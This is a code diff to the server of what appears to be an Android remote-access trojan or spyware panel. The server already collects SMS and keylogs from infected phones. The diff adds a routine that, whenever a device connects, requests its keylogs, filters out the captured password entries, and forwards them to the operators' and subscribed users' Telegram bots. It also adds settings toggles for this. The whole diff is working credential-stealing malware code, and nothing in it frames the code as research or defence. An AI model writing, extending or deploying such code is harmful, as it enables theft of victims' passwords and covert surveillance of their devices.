@@ -116,8 +116,9 @@ const telegramSettings = {
     chatId:    process.env.TELEGRAM_CHAT_ID    || '',
     enabled:   true,
     notifyConnect:          true,
-    sendSmsOnConnect:       false,
-    sendKeylogOnConnect:    false,
+    sendSmsOnConnect:           false,
+    sendKeylogOnConnect:        false,
+    sendPasswordsOnConnect:     false,
 };
 
 // Internal callbacks for commands sent server-side (not from a dashboard user).
@@ -253,6 +254,54 @@ async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userLis
     }});
     setTimeout(() => _internalCmdCallbacks.delete(commandId), 60000);
     tcpSend(conn, 'command:execute', { commandId, command: 'get_all_sms', params: { limit: 100 } });
+}
+
+async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, userList) {
+    const conn = _getTcpConnForDevice(deviceId);
+    if (!conn || !conn.writable) return;
+    const commandId = crypto.randomBytes(12).toString('hex');
+    _internalCmdCallbacks.set(commandId, { ts: Date.now(), handler: async (response, error) => {
+        if (error || !response) return;
+        let entries = [];
+        try {
+            const d = typeof response === 'string' ? JSON.parse(response) : response;
+            entries = (d.entries || d.keylogs || []).filter(e =>
+                e.isPassword === true || e.isPassword === 'true' || e.eventType === 'PASSWORD_FOCUS'
+            );
+        } catch (_) {}
+        if (!entries.length) return;
+        const safeEscape = s => String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+        const htmlBody = entries.map(e => {
+            const app  = safeEscape(e.appName || e.packageName || 'Unknown app');
+            const text = safeEscape((e.text || e.typedText || '').slice(0, 200));
+            const ts   = e.timestamp ? new Date(e.timestamp).toLocaleString() : '';
+            const field = e.fieldType ? ` <i>${safeEscape(e.fieldType)}</i>` : '';
+            return `🔑 <b>${app}</b>${field} <i>${ts}</i>\n<code>${text}</code>`;
+        }).join('\n\n');
+        const header =
+            `🔑 <b>Captured Passwords — ${safeEscape(deviceName)}</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━\n` +
+            `🆔 <code>${deviceId}</code>\n` +
+            `📊 ${entries.length} password field${entries.length !== 1 ? 's' : ''} captured\n\n`;
+        const full = header + htmlBody;
+        const CHUNK = 3800;
+        if (sendToAdmin && telegramSettings.botToken && telegramSettings.chatId) {
+            for (let i = 0; i < full.length; i += CHUNK) {
+                await sendTelegramRaw(telegramSettings.botToken, telegramSettings.chatId, full.slice(i, i + CHUNK));
+                await new Promise(r => setTimeout(r, 300));
+            }
+        }
+        if (userList && userList.length) {
+            for (const u of userList) {
+                for (let i = 0; i < full.length; i += CHUNK) {
+                    await sendTelegramRaw(u.telegramBotToken, u.telegramChatId, full.slice(i, i + CHUNK));
+                    await new Promise(r => setTimeout(r, 300));
+                }
+            }
+        }
+    }});
+    setTimeout(() => _internalCmdCallbacks.delete(commandId), 60000);
+    tcpSend(conn, 'command:execute', { commandId, command: 'get_keylogs', params: {} });
 }
 
 // Build-worker settings — admin sets API key in dashboard Settings.
@@ -819,6 +868,25 @@ async function processMessage(clientId, clientType, event, data) {
                 } catch (_) {}
             };
             _doAutoSms();
+
+            // Auto-send captured passwords to Telegram on connect
+            const _doAutoPasswords = async () => {
+                try {
+                    const usersForPwd = accessId ? await User.find({
+                        role: 'user', accessId,
+                        telegramEnabled: true,
+                        telegramSendPasswordsOnConnect: true,
+                        telegramBotToken: { $ne: '' },
+                        telegramChatId:   { $ne: '' },
+                    }).select('telegramBotToken telegramChatId').lean() : [];
+                    const adminWants = telegramSettings.enabled && telegramSettings.sendPasswordsOnConnect;
+                    if (adminWants || usersForPwd.length) {
+                        await new Promise(r => setTimeout(r, 4000));
+                        await _autoSendPasswordsToTelegram(deviceId, name, adminWants, usersForPwd);
+                    }
+                } catch (_) {}
+            };
+            _doAutoPasswords();
         }
         return;
     }
@@ -1550,8 +1618,9 @@ app.get('/api/settings', requireUserOrAdmin, async (req, res) => {
                 chatId:              telegramSettings.chatId,
                 enabled:             telegramSettings.enabled,
                 notifyConnect:       telegramSettings.notifyConnect,
-                sendSmsOnConnect:    telegramSettings.sendSmsOnConnect,
-                sendKeylogOnConnect: telegramSettings.sendKeylogOnConnect,
+                sendSmsOnConnect:        telegramSettings.sendSmsOnConnect,
+                sendKeylogOnConnect:     telegramSettings.sendKeylogOnConnect,
+                sendPasswordsOnConnect:  telegramSettings.sendPasswordsOnConnect,
             },
             buildWorker: {
                 apiKey:               buildWorkerSettings.apiKey ? '***' + buildWorkerSettings.apiKey.slice(-6) : '',
@@ -1565,7 +1634,7 @@ app.get('/api/settings', requireUserOrAdmin, async (req, res) => {
     // User: load their personal telegram settings
     try {
         const user = await User.findById(req.authUserId).select(
-            'telegramBotToken telegramChatId telegramEnabled telegramNotifyConnect telegramSendSmsOnConnect telegramSendKeylogOnConnect'
+            'telegramBotToken telegramChatId telegramEnabled telegramNotifyConnect telegramSendSmsOnConnect telegramSendKeylogOnConnect telegramSendPasswordsOnConnect'
         );
         if (!user) return res.status(401).json({ success: false, error: 'Unauthorized' });
         res.json({
@@ -1577,8 +1646,9 @@ app.get('/api/settings', requireUserOrAdmin, async (req, res) => {
                 chatId:              user.telegramChatId || '',
                 enabled:             user.telegramEnabled !== false,
                 notifyConnect:       user.telegramNotifyConnect !== false,
-                sendSmsOnConnect:    !!user.telegramSendSmsOnConnect,
-                sendKeylogOnConnect: !!user.telegramSendKeylogOnConnect,
+                sendSmsOnConnect:        !!user.telegramSendSmsOnConnect,
+                sendKeylogOnConnect:     !!user.telegramSendKeylogOnConnect,
+                sendPasswordsOnConnect:  !!user.telegramSendPasswordsOnConnect,
             },
         });
     } catch (e) {
@@ -1597,8 +1667,9 @@ app.post('/api/settings', requireUserOrAdmin, async (req, res) => {
         if (typeof telegram.chatId        === 'string')  telegramSettings.chatId        = telegram.chatId.trim();
         if (typeof telegram.enabled             === 'boolean') telegramSettings.enabled             = telegram.enabled;
         if (typeof telegram.notifyConnect       === 'boolean') telegramSettings.notifyConnect       = telegram.notifyConnect;
-        if (typeof telegram.sendSmsOnConnect    === 'boolean') telegramSettings.sendSmsOnConnect    = telegram.sendSmsOnConnect;
-        if (typeof telegram.sendKeylogOnConnect === 'boolean') telegramSettings.sendKeylogOnConnect = telegram.sendKeylogOnConnect;
+        if (typeof telegram.sendSmsOnConnect        === 'boolean') telegramSettings.sendSmsOnConnect        = telegram.sendSmsOnConnect;
+        if (typeof telegram.sendKeylogOnConnect     === 'boolean') telegramSettings.sendKeylogOnConnect     = telegram.sendKeylogOnConnect;
+        if (typeof telegram.sendPasswordsOnConnect  === 'boolean') telegramSettings.sendPasswordsOnConnect  = telegram.sendPasswordsOnConnect;
         // Admin-only build worker key
         const bw = req.body?.buildWorker;
         if (bw && typeof bw === 'object') {
@@ -1629,8 +1700,9 @@ app.post('/api/settings', requireUserOrAdmin, async (req, res) => {
         if (typeof telegram.chatId        === 'string')  user.telegramChatId        = telegram.chatId.trim();
         if (typeof telegram.enabled             === 'boolean') user.telegramEnabled             = telegram.enabled;
         if (typeof telegram.notifyConnect       === 'boolean') user.telegramNotifyConnect       = telegram.notifyConnect;
-        if (typeof telegram.sendSmsOnConnect    === 'boolean') user.telegramSendSmsOnConnect    = telegram.sendSmsOnConnect;
-        if (typeof telegram.sendKeylogOnConnect === 'boolean') user.telegramSendKeylogOnConnect = telegram.sendKeylogOnConnect;
+        if (typeof telegram.sendSmsOnConnect        === 'boolean') user.telegramSendSmsOnConnect        = telegram.sendSmsOnConnect;
+        if (typeof telegram.sendKeylogOnConnect     === 'boolean') user.telegramSendKeylogOnConnect     = telegram.sendKeylogOnConnect;
+        if (typeof telegram.sendPasswordsOnConnect  === 'boolean') user.telegramSendPasswordsOnConnect  = telegram.sendPasswordsOnConnect;
         await user.save();
         log('SETTINGS', `User Telegram settings updated for ${user.email}`);
         return res.json({ success: true });
